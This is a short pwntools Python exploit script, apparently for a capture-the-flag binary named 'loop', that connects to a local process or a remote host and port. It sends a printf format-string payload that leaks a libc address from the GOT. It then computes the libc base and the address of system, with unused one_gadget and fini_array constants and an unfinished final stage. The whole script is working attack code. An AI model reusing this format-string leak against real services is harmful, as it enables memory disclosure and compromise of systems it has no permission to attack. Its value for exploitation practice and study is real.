#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'

fini_array = 0x600E18
main = 0x400805
offset = 12

local = 1
if local:
	p = process('./loop')
	libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
	one_gadget = 0x4f2c5
	one_gadget = 0x4f322
	one_gadget = 0x10a38c
else:
	p = remote('15.165.78.226', 2311)
	libc = ELF('./libc.so.6')

elf = ELF('./loop')
printf_got = elf.got['printf']
libc_start_main_got = elf.got['__libc_start_main']

gdb.attach(p, 'b *0x400898')

payload = '%13$saaa' + p64(printf_got)
payload = '%13$saaa' + p64(libc_start_main_got)
 
p.recvuntil('your name?')
p.sendline(payload)
data = p.recvuntil('\x7f')
addr = u64(data[-6:].ljust(8, '\x00'))
libc_base = addr - libc.symbols['__libc_start_main']
info('libc_base = ' + hex(libc_base))
system_addr = libc_base + libc.symbols['system']
info('system_addr = ' + hex(system_addr))

p.interactive()

